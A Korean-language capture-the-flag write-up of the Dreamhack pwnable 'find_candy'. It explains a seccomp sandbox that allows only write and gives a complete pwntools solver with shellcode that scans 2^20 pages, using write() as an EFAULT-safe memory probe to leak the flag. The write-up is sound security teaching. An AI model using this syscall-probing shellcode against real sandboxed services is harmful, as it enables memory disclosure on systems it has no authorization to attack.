# ✏️ find_candy

> Category: pwnable

플래그를 메모리 어딘가에 숨겨두고, 셸코드로 그 위치를 찾아내라는 문제다.
이름대로 사탕 찾기다.

## 📄 Vulnerability & Code Analysis

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
```

보호 기법은 전부 켜져 있지만 이번엔 하나도 의미가 없다. 스택을 넘기는 문제가 아니고,
프로그램이 직접 RWX 영역을 만들어 거기로 점프해 주기 때문이다.

### main

```c
// 플래그를 어딘가에 올려둔다
open("./flag", O_RDONLY);
flag_mem = mmap((void *)((((uint64_t)rand() << 12) & 0x0000fffff000) | 0x080000000000),
                0x1000, PROT_WRITE | PROT_READ, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
read(fd, flag_mem, 0x500);
close(fd);

// 셸코드가 들어갈 자리
sh = mmap((void *)0xbeefdead000, 0x1000, 7, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
memset(sh, 0x90, 0x1000);
memcpy(sh, stub, sizeof(stub) - 1);

// rsp 로 쓸 자리
stack_mem = mmap((void *)0xdeadbeef000, 0x1000, PROT_WRITE | PROT_READ, ...);

puts("find me :) ");
printf("shellcode: ");
read(0, sh + sizeof(stub) - 1, 1000);

Sandbox();
asm("mov %0, %%rsp" :: "r"(stack_mem));
asm("add $0x800, %rsp");
asm("mov %0, %%rax" :: "r"(sh));
asm("jmp *%rax");
```

중요한 건 **플래그를 우리가 열 필요가 없다는 점**이다. 프로그램이 이미 `open` + `read`를
끝내고 메모리에 올려놨다. 남은 일은 "읽기"가 아니라 "찾기"다. 그래서 `find me :)` 다.

주소는 이렇게 정해진다.

| 연산 | 효과 |
|---|---|
| `rand() << 12` | 아래 12비트를 0으로 만든다 (페이지 정렬) |
| `& 0x0000fffff000` | `f`가 5개 = 비트 12\~31만 남기고 나머지는 버린다 |
| `\| 0x080000000000` | 비트 43을 켠다 — 고정된 베이스 |

`&`는 "여기만 남겨라", `|`는 "여기는 무조건 켜라"로 읽으면 된다. 결과는

```
0x080000000000  +  (자유 비트 20개 << 12)
   ↑ 고정             ↑ 매번 랜덤
```

자유 비트가 20개이므로 후보는 **2^20 = 1,048,576개**, 범위는
`0x080000000000` \~ `0x0800fffff000`로 4GB다.

### Sandbox

```c
ctx = seccomp_init(SCMP_ACT_KILL);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(arch_prctl), 0);
seccomp_load(ctx);
```

기본 동작이 `SCMP_ACT_KILL`이다. 즉 **기본은 죽이고**, `write`와 `arch_prctl` 두 개만
허용으로 뚫어줬다. `open`, `read`는 물론이고 `execve`도, 심지어 `exit`도 부르는 순간
SIGSYS로 죽는다. ORW 셸코드는 첫 syscall에서 끝난다.

### stub

```c
uint8_t stub[] = "H1\xc0H1\xdbH1\xc9H1\xd2H1\xf6H1\xffH1\xedM1\xc0M1"
                 "\xc9M1\xd2M1\xdbM1\xe4M1\xedM1\xf6M1\xff\xc5\xfc\x77";
```

전부 `xor reg, reg`이고 마지막 3바이트는 `vzeroupper`다. 우리 셸코드보다 먼저 실행되어
**모든 레지스터를 0으로 밀어버린다.** `rsp`도 libc와 무관한 새 mmap으로 교체된다.

이 때문에 "난수 시드를 읽어서 주소를 계산한다"는 접근이 막힌다. 시드는 `/dev/urandom`에서
왔고 지역변수도 `seed = 0`으로 지웠다. libc 내부의 난수 상태를 읽으려면 libc 주소가
필요한데, 레지스터도 스택도 깨끗하니 **주소를 추측할 출발점이 하나도 없다.**

### 취약점

> 1000바이트짜리 셸코드를 RWX 영역에서 실행할 수 있다. 쓸 수 있는 syscall은 `write`뿐이고,
> 플래그는 4GB 범위 안의 어느 한 페이지에 이미 올라가 있다.

## 🗡️ Exploit / Solver Strategy

### 접속을 반복하는 방법은 쓸 수 없다

후보가 백만 개라 "한 번에 한 주소씩 찍어본다"가 먼저 떠오르지만 안 된다.
`Init()`에서 `srand(seed)`를 **접속할 때마다** 새로 하므로, 끊고 다시 붙으면 주소도 새로
뽑힌다. 밖에서 반복해도 정보가 누적되지 않는다. 문제 서버에 백만 번 접속하는 것 자체도
할 일이 아니다.

그래서 루프는 셸코드 안에 들어가야 한다. 한 번의 실행에서 전 구간을 훑는다.

### 매핑 안 된 주소를 건드려도 죽지 않는다

여기가 이 문제의 핵심이다. 후보 1,048,576개 중 실제로 매핑된 건 단 하나고, 나머지는 전부
빈 주소다. `mov rax, [주소]` 같은 명령으로 직접 읽으면 SIGSEGV로 죽는다.

그런데 **syscall로 접근하면 다르다.** 커널은 유저가 넘긴 포인터를 믿지 않고, 복사하기 전에
유효성을 먼저 검사한다. 유효하지 않으면 프로세스를 죽이는 게 아니라 `rax`에
`-14`(EFAULT, Bad address)를 담아 그냥 돌아온다.

그리고 우리에게 허용된 syscall이 `write`다. 즉 `write`는 플래그를 뽑는 수단이면서
동시에 **주소를 안전하게 찔러보는 탐침**이다. 하나로 두 일을 한다.

덧붙여 빈 주소에서는 복사를 시작조차 하지 않으므로 쓰레기 값도 출력되지 않는다.
화면에는 플래그 하나만 깔끔하게 찍힌다.

### 레지스터 설계

| 레지스터 | 값 | 비고 |
|---|---|---|
| `rax` | 1 (write) | 루프 안에서 매 바퀴 재설정 |
| `rdi` | 1 (stdout) | |
| `rsi` | 후보 주소 | `0x080000000000`에서 `0x1000`씩 증가 |
| `rdx` | `0x500` | 프로그램이 `read`로 읽어둔 길이 |
| `rbx` | `0x100000` | 남은 후보 개수 |

세 가지 결정에 이유가 있다.

**`rax`를 루프 안에서 다시 넣는 이유.** `syscall`의 반환값이 `rax`에 들어오기 때문이다.
한 번만 세팅하면 두 번째 바퀴에서 `rax`는 `-14`가 되어 있고, 그건 존재하지 않는
syscall 번호다.

**카운터를 `rcx`가 아니라 `rbx`에 두는 이유.** 처음엔 `rcx`에 뒀다가 루프가 끝나지 않았다.
`syscall` 명령은 복귀 주소를 `rcx`에, RFLAGS를 `r11`에 저장한다. 즉 `rax`만 덮이는 게
아니라 **`rcx`와 `r11`도 매 호출마다 파괴된다.** `rbx`는 건드리지 않으므로 안전하다.

**`rdx`를 `0x500`으로 잡는 이유.** 처음엔 `0x100`으로 했다가 플래그가 `DH{dfd45`에서
잘렸다. 실제 플래그 파일에는 아스키 아트가 앞에 붙어 있어 256바이트로는 모자랐다.
로컬 테스트용 `deploy/flag`는 10바이트라 이 버그가 드러나지 않았다.
위로는 한계가 있다 — 페이지가 `0x1000` 하나뿐이므로 길이를 그보다 크게 잡으면 매핑 밖을
건드려 **그 `write` 자체가 EFAULT로 실패한다.** 플래그를 찾아놓고도 아무것도 못 받는다.

| `rdx` | 결과 |
|---|---|
| `0x100` | 잘린다 |
| `0x500` | `read`가 읽어둔 전량 |
| `0x1000` 초과 | 페이지 밖을 건드려 write 전체가 실패 |

**마지막을 `ud2`로 끝내는 이유.** 스캔이 끝나면 프로그램을 종료해야 하는데 `exit`도
seccomp에 막혀 있다. 어차피 죽어야 하니 `ud2`로 즉시 SIGILL을 내는 게 깔끔하다.
이게 없으면 `run.sh`의 `timeout 120`이 만료될 때까지 연결이 닫히지 않아 솔버가 2분을
기다린다.

## 💻 Final Payload or Solver

```python
#!/usr/bin/env python3
from pwn import *

HOST, PORT =  'host3.dreamhack.games', 12811

context.arch = 'amd64'

p = remote(HOST, PORT)

# flag_mem = mmap(((rand() << 12) & 0x0000fffff000) | 0x080000000000, ...)
BASE  = 0x080000000000
PAGES = 0x100000

shellcode = asm(f'''
    mov  edi, 1                 
    mov  edx, 0x500           
    mov  ebx, {PAGES}          
    mov  rsi, {BASE}            

scan:
    mov  eax, 1                 
    syscall                     
    add  rsi, 0x1000          
    dec  rbx
    jnz  scan

    ud2                         
''')

log.info(f'shellcode: {len(shellcode)} bytes')

p.sendafter(b'shellcode: ', shellcode)
p.interactive()
```

셸코드는 46바이트다. 입력 한도는 1000바이트이므로 여유가 많다.

## 🏳️ cat flag

```
$ python find_candy.py
[+] Opening connection to host3.dreamhack.games on port 12811: Done
[*] shellcode: 46 bytes
[*] Switching to interactive mode
▕▔╲┈╱▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔╲┈╱▔▏
▕╭▕▔▏      Oh you found candy! goodjob :)      ▕▔▏╭▏
▕╯▕▂▏   DH{<FLAG_REDACTED>}                     ▂▏╯▏
▕▂╱┈╲▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂╱┈╲▂▏
```

백만 번 접속해야 할 것 같던 문제가 한 번 접속에 0.5초로 끝난다.
성공하는 `write`는 단 1번, 나머지 1,048,575번은 EFAULT로 조용히 넘어간다.

로컬 검증은 배포된 Dockerfile을 그대로 빌드해서 했다.

```bash
docker build -t find_candy .
docker run -d --name find_candy -p 31337:31337 find_candy
```

`xinetd`가 접속마다 `run.sh`를 실행하는 구조이므로, 밖에서는 31337 포트로 붙기만 하면
된다. 단 `run.sh`에 `exec 2>/dev/null`이 있어 **stderr가 버려진다** — 크래시 메시지가
원격에서 보이지 않으니 디버깅할 때 염두에 둬야 한다.

## 🔑 Key Takeaways

- 함수 이름이 `Sandbox`라고 해서 다 같은 게 아니다. `cube`는 `chroot`였고 여기는 seccomp다. 허용 목록을 직접 읽어야 쓸 수 있는 syscall이 정해진다.
- 플래그를 프로그램이 이미 읽어줬다면 할 일은 ORW가 아니라 주소 찾기다. 기법 이름보다 "지금 내가 가진 능력"을 먼저 한 문장으로 적는 게 빠르다.
- 비트마스크는 16진수 한 자리 = 4비트로 세면 눈으로 읽힌다. `&`는 "여기만 남겨", `|`는 "여기는 무조건 켜".
- 직접 메모리 접근은 SIGSEGV지만, syscall로 넘긴 포인터는 커널이 검사해서 EFAULT만 돌려준다. 이 차이가 메모리 스캔을 가능하게 한다.
- `syscall`은 `rax`, `rcx`, `r11`을 파괴한다. 루프 카운터를 `rcx`에 두면 끝나지 않는다.
- 테스트 데이터가 실물보다 작으면 길이 버그가 숨는다. 로컬 `flag`는 10바이트, 실제는 256바이트를 넘었다.
- 종료 수단도 syscall이다. `exit`이 막힌 샌드박스에서는 `ud2` 같은 비정상 종료가 가장 깔끔하다.
